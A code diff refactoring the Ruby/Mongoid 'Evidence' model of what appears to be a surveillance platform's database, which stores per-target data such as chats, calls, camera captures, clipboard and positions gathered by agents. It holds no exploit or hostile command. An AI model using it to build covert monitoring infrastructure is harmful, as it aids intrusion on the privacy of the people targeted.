@@ -1,12 +1,16 @@
 require 'mongoid'
+require 'rcs-common/trace'
 require 'rcs-common/keywords'
+
 require_relative '../shard'
+require_relative '../position/proximity'
+require_relative '../target_scoped'
 
-#module RCS
-#module DB
-
-
-module Evidence
+class Evidence
+  include Mongoid::Document
+  include RCS::TargetScoped
+  include RCS::DB::Proximity
+  include RCS::Tracer
   extend RCS::Tracer
 
   TYPES = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
@@ -14,41 +18,34 @@ module Evidence
 
   STAT_EXCLUSION = ['filesystem', 'info', 'command', 'ip']
 
-  def self.included(base)
-    base.field :da, type: Integer                      # date acquired
-    base.field :dr, type: Integer                      # date received
-    base.field :type, type: String
-    base.field :rel, type: Integer, default: 0         # relevance (tag)
-    base.field :blo, type: Boolean, default: false     # blotter (report)
-    base.field :note, type: String
-    base.field :aid, type: String                      # agent BSON_ID
-    base.field :data, type: Hash
-    base.field :kw, type: Array, default: []           # keywords for full text search
+  field :da, type: Integer                      # date acquired
+  field :dr, type: Integer                      # date received
+  field :type, type: String
+  field :rel, type: Integer, default: 0         # relevance (tag)
+  field :blo, type: Boolean, default: false     # blotter (report)
+  field :note, type: String
+  field :aid, type: String                      # agent BSON_ID
+  field :data, type: Hash
+  field :kw, type: Array, default: []           # keywords for full text search
 
-    # store_in collection: Evidence.collection_name('#{target}')
-    base.store_in collection: -> { self.collection_name }
+  after_create :create_callback
+  before_destroy :destroy_callback
 
-    base.after_create :create_callback
-    base.before_destroy :destroy_callback
+  index({type: 1}, {background: true})
+  index({da: 1}, {background: true})
+  index({dr: 1}, {background: true})
+  index({aid: 1}, {background: true})
+  index({rel: 1}, {background: true})
+  index({blo: 1}, {background: true})
+  index({kw: 1}, {background: true})
 
-    base.index({type: 1}, {background: true})
-    base.index({da: 1}, {background: true})
-    base.index({dr: 1}, {background: true})
-    base.index({aid: 1}, {background: true})
-    base.index({rel: 1}, {background: true})
-    base.index({blo: 1}, {background: true})
-    base.index({kw: 1}, {background: true})
+  index({'data.position' => "2dsphere"}, {background: true})
 
-    base.index({'data.position' => "2dsphere"}, {background: true})
+  shard_key :type, :da, :aid
+  validates_presence_of :type, :da, :aid
 
-    base.shard_key :type, :da, :aid
-    base.validates_presence_of :type, :da, :aid
-
-    base.scope :positions, base.where(type: 'position')
-    base.scope :stats_relevant, base.not_in(:type => STAT_EXCLUSION)
-
-    base.extend ClassMethods
-  end
+  scope :positions, where(type: 'position')
+  scope :stats_relevant, not_in(:type => STAT_EXCLUSION)
 
   def create_callback
     return if STAT_EXCLUSION.include? self.type
@@ -104,7 +101,8 @@ module Evidence
   end
 
   def target_id
-    self.class.instance_variable_get '@target_id'
+    # The class method #target_id is added by TargetScoped
+    self.class.target_id
   end
 
   def may_have_readable_text_or_face?
@@ -159,54 +157,28 @@ module Evidence
     AggregatorQueue.add(target_id, id, type)
   end
 
-  def self.target(target)
-    target_id = target.respond_to?(:id) ? target.id : target
-    dynamic_classname = "Evidence#{target_id}"
-
-    if const_defined? dynamic_classname
-      const_get dynamic_classname
-    else
-      c = Class.new do
-        extend RCS::Tracer
-        include RCS::Tracer
-        include Mongoid::Document
-        include RCS::DB::Proximity
-        include Evidence
-      end
-      c.instance_variable_set '@target_id', target_id
-      const_set(dynamic_classname, c)
-    end
+  def self.create_collection
+    # create the collection for the target's evidence and shard it
+    db = RCS::DB::DB.instance.mongo_connection
+    collection = db.collection self.collection.name
+    # ensure indexes
+    self.create_indexes
+    # enable sharding only if not enabled
+    RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1}) unless collection.stats['sharded']
   end
 
-  module ClassMethods
-    def collection_name
-      raise "Missing target id. Maybe you're trying to instantiate Evidence without using Evidence#target." unless @target_id
-      "evidence.#{@target_id}"
-    end
+  # Count the number of all the evidences grouped by type.
+  # Returns an hash like {"chat" => 3, "mic" => 0, ..., "position" => 42}
+  def self.count_by_type(where={})
+    match = where.merge(stats_relevant.selector)
+    group = {_id: '$type', count: {'$sum' => 1}}
+    project = { _id: 0, type: '$_id', count: 1}
 
-    def create_collection
-      # create the collection for the target's evidence and shard it
-      db = RCS::DB::DB.instance.mongo_connection
-      collection = db.collection self.collection.name
-      # ensure indexes
-      self.create_indexes
-      # enable sharding only if not enabled
-      RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1}) unless collection.stats['sharded']
-    end
+    results = collection.aggregate([{'$match' => match}, {'$group' => group}, {'$project' => project}])
+    results = results.inject({}) { |h, val| h[val['type']] = val['count']; h }
 
-    # Count the number of all the evidences grouped by type.
-    # Returns an hash like {"chat" => 3, "mic" => 0, ..., "position" => 42}
-    def count_by_type(where={})
-      match = where.merge(stats_relevant.selector)
-      group = {_id: '$type', count: {'$sum' => 1}}
-      project = { _id: 0, type: '$_id', count: 1}
-
-      results = collection.aggregate([{'$match' => match}, {'$group' => group}, {'$project' => project}])
-      results = results.inject({}) { |h, val| h[val['type']] = val['count']; h }
-
-      defaults = TYPES.inject({}) { |h, type| h[type.to_s] = 0; h }
-      defaults.merge!(results)
-    end
+    defaults = TYPES.inject({}) { |h, type| h[type.to_s] = 0; h }
+    defaults.merge!(results)
   end
 
   def self.dynamic_new(target)
@@ -504,6 +476,3 @@ module Evidence
     target.get_parent.restat
   end
 end
-
-#end # ::DB
-#end # ::RCS
